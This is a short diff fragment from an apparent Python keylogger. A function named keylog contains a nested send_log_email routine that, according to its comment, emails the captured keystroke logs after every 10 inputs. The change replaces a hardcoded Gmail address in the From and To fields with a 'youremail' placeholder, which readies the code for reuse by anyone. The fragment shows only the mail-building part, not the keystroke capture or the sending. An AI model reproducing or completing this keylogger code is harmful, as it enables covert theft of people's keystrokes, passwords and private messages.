@@ -17,8 +17,8 @@ def keylog():
   # This function is responsible for sending the logs after every 10 keyboard inputs via email.
   def send_log_email():
     msg = MIMEMultipart()
-    msg['From'] = 'konggodzilla012345@gmail.com'
-    msg['To'] = 'konggodzilla012345@gmail.com'
+    msg['From'] = 'youremail'
+    msg['To'] = 'youremail'
     msg['Subject'] = 'Keyboard Log'
     body = 'This is a log file.'
     msg.attach(MIMEText(body))
